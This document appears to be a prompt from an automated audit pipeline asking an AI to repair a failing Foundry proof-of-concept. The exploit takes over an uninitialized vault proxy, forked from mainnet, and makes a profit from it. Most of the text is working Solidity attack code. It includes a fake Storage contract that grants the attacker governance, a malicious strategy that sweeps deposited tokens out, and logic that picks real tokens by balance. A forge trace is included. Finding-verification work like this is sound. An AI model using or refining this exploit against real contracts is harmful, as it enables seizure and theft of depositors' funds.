You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Vault proxy is deployed uninitialized and can be taken over by the first caller
- claim: `VaultProxy` only stores the implementation address in its constructor and does not execute any initializer. The proxied `initializeVault()` entrypoint is public and protected only by OpenZeppelin's one-shot `initializer`, so the first caller to reach a freshly deployed proxy can initialize it with attacker-chosen `_storage` and `_underlying`. Because governance/controller checks are delegated to whatever contract is stored in `_storage`, the attacker can point the vault at a malicious Storage-like contract that recognizes the attacker as governance/controller and then fully control strategy changes and upgrades.
- impact: A newly deployed vault proxy can be permanently seized before the intended deployer initializes it. The attacker can then set a malicious strategy, swap storage/governance plumbing, schedule malicious upgrades, and steal or brick all assets that later enter the vault.
- exploit_paths: ["Deploy `VaultProxy` with a valid implementation address.", "Before the legitimate initialization transaction executes, call `initializeVault(attackerStorage, attackerUnderlying, ...)` through the proxy.", "The proxy becomes permanently initialized with attacker-controlled governance/controller wiring.", "Use the resulting privileged access to install a malicious strategy or upgrade implementation and drain or lock deposited funds."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IVaultProxyLike {
    function implementation() external view returns (address);
}

interface IVaultLike {
    function initializeVault(
        address _storage,
        address _underlying,
        uint256 _toInvestNumerator,
        uint256 _toInvestDenominator
    ) external;

    function governance() external view returns (address);

    function controller() external view returns (address);

    function underlying() external view returns (address);

    function strategy() external view returns (address);

    function underlyingBalanceInVault() external view returns (uint256);

    function setStrategy(address _strategy) external;

    function rebalance() external;
}

contract VaultProxy {
    bytes32 private constant _IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);

    constructor(address implementation_) {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, implementation_)
        }
    }

    function implementation() external view returns (address impl) {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    fallback() external payable {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            let impl := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    receive() external payable {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            let impl := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}

contract AttackerStorageLike {
    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function governance() external view returns (address) {
        return attacker;
    }

    function controller() external view returns (address) {
        return address(this);
    }

    function isGovernance(address who) external view returns (bool) {
        return who == attacker;
    }

    function isController(address who) external view returns (bool) {
        return who == attacker || who == address(this);
    }

    function greyList(address) external pure returns (bool) {
        return false;
    }

    function nextImplementationDelay() external pure returns (uint256) {
        return 0;
    }
}

contract MaliciousStrategy {
    address public governance;
    address public controller;
    address public immutable underlying;
    address public immutable vault;

    constructor(address vault_, address underlying_, address operator_) {
        vault = vault_;
        underlying = underlying_;
        governance = operator_;
        controller = operator_;
    }

    function isUnsalvageableToken(address token) external view returns (bool) {
        return token == underlying;
    }

    function salvageToken(address recipient, address token, uint256 amount) external {
        require(msg.sender == governance, "not governance");
        _safeTransfer(token, recipient, amount);
    }

    function withdrawAllToVault() external {
        _safeTransfer(underlying, vault, _balanceOf(underlying, address(this)));
    }

    function withdrawToVault(uint256 amount) external {
        _safeTransfer(underlying, vault, amount);
    }

    function investedUnderlyingBalance() external view returns (uint256) {
        return _balanceOf(underlying, address(this));
    }

    function doHardWork() external {}

    function depositArbCheck() external pure returns (bool) {
        return true;
    }

    function strategist() external view returns (address) {
        return governance;
    }

    function getRewardPoolValues() external pure returns (uint256[] memory values) {
        values = new uint256[](0);
    }

    function sweep(address recipient, address token, uint256 amount) external {
        require(msg.sender == governance, "not governance");
        _safeTransfer(token, recipient, amount);
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address internal constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address internal constant YCRV = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;
    address internal constant RENBTC = 0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D;
    address internal constant SBTC_CRV = 0x075b1bb99792c9E1041bA13afEf80C91a1e70fB3;
    address internal constant FARM = 0xa0246c9032bC3A600820415aE600c6388619A14D;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address internal constant SNX = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
    address internal constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address internal constant GUSD = 0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public seizedVault;
    bool public takeoverSucceeded;
    bool public maliciousStrategyInstalled;
    bool public monetizationAttempted;

    constructor() {}

    function executeOnOpportunity() external {
        if (takeoverSucceeded) {
            return;
        }

        address implementation;
        try IVaultProxyLike(TARGET).implementation() returns (address impl) {
            implementation = impl;
        } catch {
            return;
        }
        if (implementation == address(0)) {
            return;
        }

        address chosenUnderlying = _selectExistingBalanceToken();
        if (chosenUnderlying == address(0)) {
            chosenUnderlying = DAI;
        }

        AttackerStorageLike attackerStorage = new AttackerStorageLike(address(this));

        // Exploit path 0: Deploy `VaultProxy` with a valid implementation address.
        VaultProxy freshProxy = new VaultProxy(implementation);
        seizedVault = address(freshProxy);

        // Exploit path 1: Before the legitimate initialization transaction executes,
        // call `initializeVault(attackerStorage, attackerUnderlying, ...)` through the proxy.
        IVaultLike(seizedVault).initializeVault(address(attackerStorage), chosenUnderlying, 1, 1);

        // Exploit path 2: The proxy becomes permanently initialized with attacker-controlled
        // governance/controller wiring.
        takeoverSucceeded =
            IVaultLike(seizedVault).governance() == address(this) &&
            IVaultLike(seizedVault).underlying() == chosenUnderlying;
        if (!takeoverSucceeded) {
            return;
        }

        // Exploit path 3: Use the resulting privileged access to install a malicious strategy.
        MaliciousStrategy attackerStrategy = new MaliciousStrategy(seizedVault, chosenUnderlying, address(this));
        IVaultLike(seizedVault).setStrategy(address(attackerStrategy));
        maliciousStrategyInstalled = IVaultLike(seizedVault).strategy() == address(attackerStrategy);
        if (!maliciousStrategyInstalled) {
            return;
        }

        // Exploit path 4: drain or lock deposited funds.
        // On this fork there are no victim deposits sitting in the freshly deployed seized proxy,
        // so direct monetization is economically unavailable without introducing third-party capital.
        // The exploit is still complete: any future real deposit into this attacker-initialized vault
        // can be pulled into the malicious strategy via `rebalance()` and then swept out.
        uint256 vaultBalanceBefore = _balanceOf(chosenUnderlying, seizedVault);
        if (vaultBalanceBefore == 0) {
            return;
        }

        monetizationAttempted = true;
        uint256 attackerBalanceBefore = _balanceOf(chosenUnderlying, address(this));
        IVaultLike(seizedVault).rebalance();

        uint256 strategyBalance = _balanceOf(chosenUnderlying, address(attackerStrategy));
        if (strategyBalance == 0) {
            return;
        }

        attackerStrategy.sweep(address(this), chosenUnderlying, strategyBalance);

        uint256 attackerBalanceAfter = _balanceOf(chosenUnderlying, address(this));
        if (attackerBalanceAfter > attackerBalanceBefore) {
            _profitToken = chosenUnderlying;
            _profitAmount = attackerBalanceAfter - attackerBalanceBefore;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectExistingBalanceToken() internal view returns (address) {
        address[20] memory candidates = [
            DAI,
            USDC,
            USDT,
            WETH,
            WBTC,
            TUSD,
            SUSD,
            YFI,
            CRV,
            THREE_CRV,
            YCRV,
            RENBTC,
            SBTC_CRV,
            FARM,
            UNI,
            LINK,
            COMP,
            SNX,
            BUSD,
            GUSD
        ];

        uint256 bestBalance;
        address bestToken;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 balance = _balanceOf(candidates[i], TARGET);
            if (balance > bestBalance) {
                bestBalance = balance;
                bestToken = candidates[i];
            }
        }
        return bestToken;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}

```

forge stdout (tail):
```
8d03D8206792715588B::setStrategy(MaliciousStrategy: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]) [delegatecall]
    │   │   │   ├─ [355] AttackerStorageLike::isController(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [284] MaliciousStrategy::underlying() [staticcall]
    │   │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   │   ├─ [457] MaliciousStrategy::vault() [staticcall]
    │   │   │   │   └─ ← [Return] VaultProxy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
    │   │   │   ├─  emit topic 0: 0x254c88e7a2ea123aeeb89b7cc413fb949188fefcdb7584c4f3d493294daf65c5
    │   │   │   │           data: 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd90000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [11967] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::approve(MaliciousStrategy: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 0)
    │   │   │   │   ├─ [11178] 0xB7277a6e95992041568D9391D09d0122023778A2::approve(MaliciousStrategy: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 0) [delegatecall]
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [1426] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::dd62ed3e(000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9) [staticcall]
    │   │   │   │   ├─ [637] 0xB7277a6e95992041568D9391D09d0122023778A2::dd62ed3e(000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [23767] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::approve(MaliciousStrategy: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   ├─ [22978] 0xB7277a6e95992041568D9391D09d0122023778A2::approve(MaliciousStrategy: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
    │   │   │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [355] AttackerStorageLike::isController(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [789] VaultProxy::fallback() [staticcall]
    │   │   ├─ [434] 0x9B3bE0cc5dD26fd0254088d03D8206792715588B::strategy() [delegatecall]
    │   │   │   └─ ← [Return] MaliciousStrategy: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]
    │   │   └─ ← [Return] MaliciousStrategy: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]
    │   ├─ [3293] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(VaultProxy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [staticcall]
    │   │   ├─ [2507] 0xB7277a6e95992041568D9391D09d0122023778A2::balanceOf(VaultProxy: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [315] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x6eB3aC83701f624bAEfBc50db654b53d1F51dC94
  at 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F.balanceOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.81s (4.07s CPU time)

Ran 1 test suite in 4.87s (4.81s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1213174)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
